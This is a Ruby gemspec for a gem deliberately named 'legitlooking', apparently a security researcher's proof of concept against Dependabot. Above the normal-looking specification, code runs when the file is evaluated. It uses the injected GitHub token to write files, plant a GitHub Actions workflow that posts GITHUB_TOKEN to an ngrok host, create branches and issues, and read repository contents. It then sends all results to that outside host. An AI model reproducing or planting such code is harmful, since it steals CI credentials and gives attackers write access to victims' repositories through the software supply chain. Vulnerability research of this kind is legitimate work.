# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "json"
  require "base64"

  lines = []

  HDRS = {
    "Accept"               => "application/vnd.github+json",
    "X-GitHub-Api-Version" => "2022-11-28",
    "Content-Type"         => "application/json"
  }

  def gh(method, path, body = nil)
    uri = URI("https://api.github.com#{path}")
    req = case method
          when :get    then Net::HTTP::Get.new(uri)
          when :put    then Net::HTTP::Put.new(uri)
          when :post   then Net::HTTP::Post.new(uri)
          when :delete then Net::HTTP::Delete.new(uri)
          end
    HDRS.each { |k, v| req[k] = v }
    req.body = body.to_json if body
    res = Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                          open_timeout: 10, read_timeout: 10) { |h| h.request(req) }
    [res.code, res.body.to_s[0, 1000]]
  rescue => e
    ["ERR", e.message]
  end

  REPO = "ugurcanli/testpen"

  # ============================================================
  # 1. BESTAND SCHRIJVEN IN DE REPO
  #    Kan de token een nieuw bestand aanmaken via Contents API?
  # ============================================================
  lines << "=== 1. PUT /contents/poc-write-test.txt ==="
  poc_content = Base64.strict_encode64("PoC: Dependabot RCE grants repository write access\nTimestamp: #{Time.now}\n")
  code, body = gh(:put, "/repos/#{REPO}/contents/poc-write-test.txt", {
    message: "PoC: write access via Dependabot RCE",
    content: poc_content
  })
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 2. MALICIEUZE GITHUB ACTIONS WORKFLOW INJECTEREN
  #    Meest kritieke write test -- workflow met GITHUB_TOKEN
  # ============================================================
  lines << "\n=== 2. PUT .github/workflows/poc-evil.yml ==="
  evil_workflow = Base64.strict_encode64(<<~YAML)
    name: poc-injected
    on: [push, workflow_dispatch]
    jobs:
      exfil:
        runs-on: ubuntu-latest
        steps:
          - name: exfil
            run: |
              curl -s -X POST #{COLLAB_URL}?poc=workflow_injection \\
                -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY"
    YAML
  code, body = gh(:put, "/repos/#{REPO}/contents/.github/workflows/poc-evil.yml", {
    message: "PoC: workflow injection via Dependabot RCE",
    content: evil_workflow
  })
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 3. BRANCH AANMAKEN
  #    Kan de token een nieuwe branch aanmaken?
  # ============================================================
  lines << "\n=== 3. BRANCH AANMAKEN ==="
  # Haal eerst de SHA van main op
  code, body = gh(:get, "/repos/#{REPO}/git/ref/heads/main")
  lines << "GET main SHA: HTTP #{code}: #{body[0, 200]}"
  sha = body.match(/"sha":"([a-f0-9]{40})"/)&.[](1)
  lines << "SHA: #{sha}"

  if sha
    code, body = gh(:post, "/repos/#{REPO}/git/refs", {
      ref: "refs/heads/poc-dependabot-write-#{Time.now.to_i}",
      sha: sha
    })
    lines << "Create branch HTTP #{code}: #{body}"
  end

  # ============================================================
  # 4. BESTAND LEZEN -- private bestanden toegankelijk?
  # ============================================================
  lines << "\n=== 4. REPO CONTENTS LEZEN ==="
  code, body = gh(:get, "/repos/#{REPO}/contents/.github/dependabot.yml")
  lines << "HTTP #{code}: #{body[0, 500]}"

  # Kan de token ook code lezen?
  code, body = gh(:get, "/repos/#{REPO}/contents/dependabot_poc/callback_listener.py")
  lines << "callback_listener.py HTTP #{code}: #{body[0, 200]}"

  # ============================================================
  # 5. PUSH DIRECT VIA GIT OBJECTS API
  #    Laagste niveau write operatie
  # ============================================================
  lines << "\n=== 5. GIT BLOB AANMAKEN ==="
  code, body = gh(:post, "/repos/#{REPO}/git/blobs", {
    content: "PoC write via Dependabot RCE git objects API",
    encoding: "utf-8"
  })
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 6. ISSUE AANMAKEN (eerder al getest maar opnieuw bevestigen)
  # ============================================================
  lines << "\n=== 6. ISSUE AANMAKEN ==="
  code, body = gh(:post, "/repos/#{REPO}/issues", {
    title: "PoC: Dependabot RCE write access confirmed",
    body: "This issue was created from within a Dependabot execution container via the injected GitHub API token. Proof of write access via RCE."
  })
  lines << "HTTP #{code}: #{body[0, 300]}"

  # ============================================================
  # 7. BESCHERMDE BRANCH STATUS -- is main protected?
  # ============================================================
  lines << "\n=== 7. BRANCH PROTECTION ==="
  code, body = gh(:get, "/repos/#{REPO}/branches/main")
  lines << "HTTP #{code}: #{body[0, 500]}"

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=write_access_test")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 30) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=write_access_test&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.31"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
